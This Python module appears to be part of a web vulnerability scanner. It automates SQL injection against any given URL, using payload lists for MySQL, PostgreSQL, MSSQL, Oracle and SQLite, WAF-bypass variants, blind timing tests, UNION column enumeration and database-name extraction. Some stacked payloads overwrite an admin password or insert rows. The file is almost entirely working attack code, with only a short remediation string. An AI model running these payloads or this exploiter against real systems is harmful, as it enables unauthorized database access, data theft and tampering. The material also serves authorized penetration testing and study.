"""
Advanced SQL Injection Exploitation Module.
Professional-grade SQLi testing with data extraction and multi-database support.
"""
import re
import time
import logging
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import requests
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed

logger = logging.getLogger(__name__)

# Comprehensive SQLi payloads by technique and database
SQLI_PAYLOADS = {
    # Error-based injection
    'error_based': [
        # MySQL
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--",
        
        # PostgreSQL
        "' AND CAST((SELECT version()) AS INT)--",
        "' AND 1=CAST((CHR(126)||version()||CHR(126)) AS INT)--",
        
        # MSSQL
        "' AND 1=CONVERT(INT,@@version)--",
        "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        
        # Oracle
        "' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--",
        
        # Generic
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "admin' --",
        "admin'/*",
        "1' OR '1'='1",
        "1 OR 1=1",
        "' HAVING 1=1--",
        "' GROUP BY columnname HAVING 1=1--",
    ],
    
    # Boolean-based blind
    'boolean_blind': [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND SUBSTRING((SELECT @@version),1,1)='5'--",
        "' AND (SELECT LENGTH(database()))>0--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
    ],
    
    # Time-based blind
    'time_blind': [
        # MySQL
        "' OR SLEEP(5)--",
        "' AND SLEEP(5)--",
        "' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)--",
        "1' AND SLEEP(5)--",
        "1'; SELECT SLEEP(5)--",
        "' OR IF(1=1,SLEEP(5),0)--",
        
        # PostgreSQL
        "' OR pg_sleep(5)--",
        "' AND (SELECT pg_sleep(5))--",
        "'; SELECT pg_sleep(5)--",
        
        # MSSQL
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND 1=1; WAITFOR DELAY '0:0:5'--",
        
        # SQLite
        "' AND randomblob(300000000)--",
        
        # Oracle
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    ],
    
    # UNION-based injection
    'union_based': [
        # Column enumeration
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
        
        # Data extraction templates
        "' UNION SELECT table_schema,table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT username,password,NULL FROM users--",
    ],
    
    # Stacked queries
    'stacked': [
        "'; SELECT @@version--",
        "'; SELECT * FROM users--",
        "'; INSERT INTO users VALUES('hacker','hacked')--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
    ],
    
    # Second-order injection markers
    'second_order': [
        "admin'--",
        "test' AND 1=1--",
        "user@example.com' OR '1'='1",
    ],
    
    # WAF bypass variations
    'waf_bypass': [
        # Case manipulation
        "' uNiOn SeLeCt NULL--",
        "' UnIoN sElEcT NULL--",
        
        # Comment insertion
        "' UN/**/ION SEL/**/ECT NULL--",
        "' UNI%0bON SEL%0bECT NULL--",
        "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
        
        # Encoding
        "' UNION%0ASELECT%0ANULL--",
        "' %55NION %53ELECT NULL--",
        
        # Alternative keywords
        "' || (SELECT NULL)--",
        "' && 1=1--",
    ],
}

# SQL error signatures for database fingerprinting
SQL_ERRORS = {
    'mysql': [
        r"you have an error in your sql syntax",
        r"warning.*mysql",
        r"mysql_fetch",
        r"mysql_num_rows",
        r"mysql_query",
        r"mysqli_",
        r"com\.mysql\.jdbc",
        r"org\.gjt\.mm\.mysql",
        r"\[mysql\]",
    ],
    'postgresql': [
        r"pg_query",
        r"pg_exec",
        r"postgresql.*error",
        r"psql:",
        r"org\.postgresql",
        r"pgsql",
        r"syntax error at or near",
    ],
    'mssql': [
        r"microsoft sql server",
        r"sql server.*error",
        r"odbc sql server driver",
        r"sqlsrv_",
        r"mssql_",
        r"\[sqlserver\]",
        r"unclosed quotation mark",
    ],
    'oracle': [
        r"ora-\d{5}",
        r"oracle.*error",
        r"oracle.*driver",
        r"quoted string not properly terminated",
    ],
    'sqlite': [
        r"sqlite3?\.operationalerror",
        r"sqlite.*error",
        r"unable to open database",
        r"sqlite3_",
    ],
}

@dataclass
class SQLiResult:
    url: str
    parameter: str
    payload: str
    technique: str
    database_type: Optional[str]
    success: bool
    evidence: str
    data_extracted: List[str] = field(default_factory=list)
    method: str = 'GET'
    columns_found: int = 0
    waf_detected: bool = False

class AdvancedSQLiExploiter:
    """
    Production-grade SQL injection exploitation engine.
    Features: Multi-DB support, data extraction, WAF bypass, blind techniques.
    """
    
    def __init__(self, timeout: int = 15, blind_delay: int = 5):
        self.timeout = timeout
        self.blind_delay = blind_delay
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        self.tested_count = 0
        self.db_type = None
    
    def exploit(self, url: str, extract_data: bool = True) -> List[SQLiResult]:
        """
        Comprehensive SQL injection testing.
        """
        results = []
        logger.info(f"Starting advanced SQLi scan on {url}")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Default test params if none present
        if not params:
            params = {
                'id': ['1'], 'user': ['admin'], 'page': ['1'],
                'cat': ['1'], 'item': ['1'], 'article': ['1'],
            }
        
        for param_name in params:
            logger.info(f"Testing SQLi in: {param_name}")
            
            # 1. Error-based detection (fastest)
            error_result = self._test_error_based(url, param_name, params)
            if error_result:
                results.append(error_result)
                
                # If we found SQLi, try to extract data
                if extract_data and error_result.database_type:
                    self._extract_database_info(url, param_name, params, error_result)
                continue
            
            # 2. UNION-based detection
            union_result = self._test_union_based(url, param_name, params)
            if union_result:
                results.append(union_result)
                continue
            
            # 3. Boolean-based blind
            blind_result = self._test_boolean_blind(url, param_name, params)
            if blind_result:
                results.append(blind_result)
                continue
            
            # 4. Time-based blind (slowest, use as last resort)
            time_result = self._test_time_blind(url, param_name, params)
            if time_result:
                results.append(time_result)
        
        logger.info(f"SQLi scan complete: {len(results)} vulnerabilities, {self.tested_count} tests")
        return results
    
    def _test_error_based(self, url: str, param: str, params: dict) -> Optional[SQLiResult]:
        """Test error-based SQL injection."""
        for payload in SQLI_PAYLOADS['error_based']:
            test_url = self._build_test_url(url, param, payload, params)
            
            try:
                response = self.session.get(test_url, timeout=self.timeout)
                self.tested_count += 1
                
                db_type, error_match = self._detect_sql_error(response.text)
                if db_type:
                    logger.warning(f"Error-based SQLi found: {param} -> {db_type}")
                    return SQLiResult(
                        url=test_url,
                        parameter=param,
                        payload=payload,
                        technique='error_based',
                        database_type=db_type,
                        success=True,
                        evidence=error_match[:300],
                    )
            except Exception as e:
                logger.debug(f"Error-based test failed: {e}")
        
        return None
    
    def _test_union_based(self, url: str, param: str, params: dict) -> Optional[SQLiResult]:
        """Test UNION-based injection with column enumeration."""
        # First enumerate columns
        column_count = self._enumerate_columns(url, param, params)
        
        if column_count > 0:
            # Try to extract version/database info
            union_payload = f"' UNION SELECT {'NULL,' * (column_count-1)}@@version--"
            test_url = self._build_test_url(url, param, union_payload, params)
            
            try:
                response = self.session.get(test_url, timeout=self.timeout)
                self.tested_count += 1
                
                # Look for version strings in response
                version_patterns = [
                    r'(\d+\.\d+\.\d+[-\w]*)',
                    r'(MySQL|PostgreSQL|Microsoft SQL Server|Oracle|SQLite)[\s\d\.]+',
                ]
                
                for pattern in version_patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        db_info = match.group(0)
                        logger.warning(f"UNION SQLi found: {column_count} columns, DB: {db_info}")
                        return SQLiResult(
                            url=test_url,
                            parameter=param,
                            payload=union_payload,
                            technique='union_based',
                            database_type=self._guess_db_from_version(db_info),
                            success=True,
                            evidence=f"Version: {db_info}",
                            columns_found=column_count,
                        )
            except Exception as e:
                logger.debug(f"UNION test failed: {e}")
        
        return None
    
    def _enumerate_columns(self, url: str, param: str, params: dict) -> int:
        """Enumerate number of columns for UNION injection."""
        for num_cols in range(1, 15):
            nulls = ','.join(['NULL'] * num_cols)
            payload = f"' UNION SELECT {nulls}--"
            test_url = self._build_test_url(url, param, payload, params)
            
            try:
                response = self.session.get(test_url, timeout=self.timeout)
                self.tested_count += 1
                
                # If no error and different from param error, we found column count
                if response.status_code == 200:
                    _, has_error = self._detect_sql_error(response.text)
                    if not has_error:
                        return num_cols
            except:
                pass
        
        return 0
    
    def _test_boolean_blind(self, url: str, param: str, params: dict) -> Optional[SQLiResult]:
        """Test boolean-based blind SQL injection."""
        # Get baseline response
        baseline_url = self._build_test_url(url, param, params[param][0], params)
        try:
            baseline = self.session.get(baseline_url, timeout=self.timeout)
            baseline_len = len(baseline.text)
        except:
            return None
        
        # True condition
        true_payload = "' AND 1=1--"
        true_url = self._build_test_url(url, param, f"{params[param][0]}{true_payload}", params)
        
        # False condition  
        false_payload = "' AND 1=2--"
        false_url = self._build_test_url(url, param, f"{params[param][0]}{false_payload}", params)
        
        try:
            true_resp = self.session.get(true_url, timeout=self.timeout)
            false_resp = self.session.get(false_url, timeout=self.timeout)
            self.tested_count += 2
            
            true_len = len(true_resp.text)
            false_len = len(false_resp.text)
            
            # Boolean blind: true response ~ baseline, false response different
            if abs(true_len - baseline_len) < 100 and abs(false_len - baseline_len) > 100:
                logger.warning(f"Boolean-blind SQLi found: {param}")
                return SQLiResult(
                    url=true_url,
                    parameter=param,
                    payload=true_payload,
                    technique='boolean_blind',
                    database_type=None,
                    success=True,
                    evidence=f"True response: {true_len} bytes, False response: {false_len} bytes",
                )
        except Exception as e:
            logger.debug(f"Boolean blind test failed: {e}")
        
        return None
    
    def _test_time_blind(self, url: str, param: str, params: dict) -> Optional[SQLiResult]:
        """Test time-based blind SQL injection."""
        for payload in SQLI_PAYLOADS['time_blind'][:5]:  # Limit due to slowness
            test_url = self._build_test_url(url, param, f"{params[param][0]}{payload}", params)
            
            try:
                start = time.time()
                response = self.session.get(test_url, timeout=self.timeout + self.blind_delay + 2)
                elapsed = time.time() - start
                self.tested_count += 1
                
                # If response took approximately blind_delay seconds
                if self.blind_delay - 1 <= elapsed <= self.blind_delay + 2:
                    db_type = self._guess_db_from_payload(payload)
                    logger.warning(f"Time-blind SQLi found: {param}, delay: {elapsed:.2f}s")
                    return SQLiResult(
                        url=test_url,
                        parameter=param,
                        payload=payload,
                        technique='time_blind',
                        database_type=db_type,
                        success=True,
                        evidence=f"Response delayed {elapsed:.2f} seconds",
                    )
            except requests.Timeout:
                # Timeout might indicate successful SLEEP
                db_type = self._guess_db_from_payload(payload)
                logger.warning(f"Time-blind SQLi (timeout): {param}")
                return SQLiResult(
                    url=test_url,
                    parameter=param,
                    payload=payload,
                    technique='time_blind',
                    database_type=db_type,
                    success=True,
                    evidence="Request timed out after sleep payload",
                )
            except Exception as e:
                logger.debug(f"Time blind test failed: {e}")
        
        return None
    
    def _extract_database_info(self, url: str, param: str, params: dict, result: SQLiResult):
        """Extract database schema information after confirming SQLi."""
        logger.info(f"Attempting data extraction for {result.database_type}")
        
        # Extract database name
        if result.database_type == 'mysql':
            db_payload = f"' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))--"
        elif result.database_type == 'postgresql':
            db_payload = f"' AND CAST(current_database() AS INT)--"
        else:
            return
        
        test_url = self._build_test_url(url, param, db_payload, params)
        try:
            response = self.session.get(test_url, timeout=self.timeout)
            # Look for extracted data in error message
            match = re.search(r'~([^~]+)~', response.text)
            if match:
                result.data_extracted.append(f"Database: {match.group(1)}")
                logger.info(f"Extracted database: {match.group(1)}")
        except:
            pass
    
    def _build_test_url(self, url: str, param: str, payload: str, params: dict) -> str:
        """Build URL with injected payload."""
        parsed = urlparse(url)
        test_params = {k: v[:] for k, v in params.items()}
        test_params[param] = [payload]
        
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params, doseq=True), ''
        ))
    
    def _detect_sql_error(self, html: str) -> Tuple[Optional[str], str]:
        """Detect SQL error messages and identify database."""
        html_lower = html.lower()
        
        for db_type, patterns in SQL_ERRORS.items():
            for pattern in patterns:
                match = re.search(pattern, html_lower)
                if match:
                    return db_type, match.group(0)
        
        return None, ''
    
    def _guess_db_from_payload(self, payload: str) -> Optional[str]:
        """Guess database type from payload characteristics."""
        payload_lower = payload.lower()
        if 'sleep(' in payload_lower:
            return 'mysql'
        elif 'pg_sleep' in payload_lower:
            return 'postgresql'
        elif 'waitfor delay' in payload_lower:
            return 'mssql'
        elif 'dbms_pipe' in payload_lower:
            return 'oracle'
        elif 'randomblob' in payload_lower:
            return 'sqlite'
        return None
    
    def _guess_db_from_version(self, version_str: str) -> Optional[str]:
        """Identify database from version string."""
        version_lower = version_str.lower()
        if 'mysql' in version_lower or 'mariadb' in version_lower:
            return 'mysql'
        elif 'postgresql' in version_lower:
            return 'postgresql'
        elif 'sql server' in version_lower or 'microsoft' in version_lower:
            return 'mssql'
        elif 'oracle' in version_lower:
            return 'oracle'
        elif 'sqlite' in version_lower:
            return 'sqlite'
        return None


def run_sqli_exploitation(url: str, extract: bool = True) -> List[Dict[str, Any]]:
    """
    Run comprehensive SQL injection exploitation.
    """
    exploiter = AdvancedSQLiExploiter()
    results = exploiter.exploit(url, extract_data=extract)
    
    findings = []
    for result in results:
        # Severity based on technique and data extraction
        if result.technique in ['error_based', 'union_based'] or result.data_extracted:
            severity = 'CRITICAL'
        else:
            severity = 'HIGH'
        
        description = f'{result.technique.replace("_", " ").title()} SQL injection in "{result.parameter}".'
        if result.database_type:
            description += f' Database: {result.database_type.upper()}.'
        if result.columns_found:
            description += f' {result.columns_found} columns enumerated.'
        if result.data_extracted:
            description += f' Data extracted: {", ".join(result.data_extracted)}'
        
        findings.append({
            'issue': f'SQL Injection ({result.technique.replace("_", " ").title()})',
            'severity': severity,
            'category': 'sqli',
            'impact': f'Full database compromise possible. Attacker can read, modify, or delete all database contents. May lead to authentication bypass, data theft, or remote code execution.',
            'description': description,
            'recommendation': 'Use parameterized queries (prepared statements) for ALL database operations. Apply principle of least privilege for database users. Implement WAF rules for SQLi patterns.',
            'affected_element': f'GET {result.parameter}',
            'score_impact': 35 if severity == 'CRITICAL' else 30,
            'evidence': result.evidence[:500],
            'poc': f'''# SQL Injection Proof of Concept
# Database: {result.database_type or 'Unknown'}
# Technique: {result.technique}

curl "{result.url}"

# Payload used:
# {result.payload}
''',
            'confidence': 'HIGH',
            'database_type': result.database_type,
        })
    
    logger.info(f"Advanced SQLi scan: {len(findings)} vulnerabilities")
    return findings
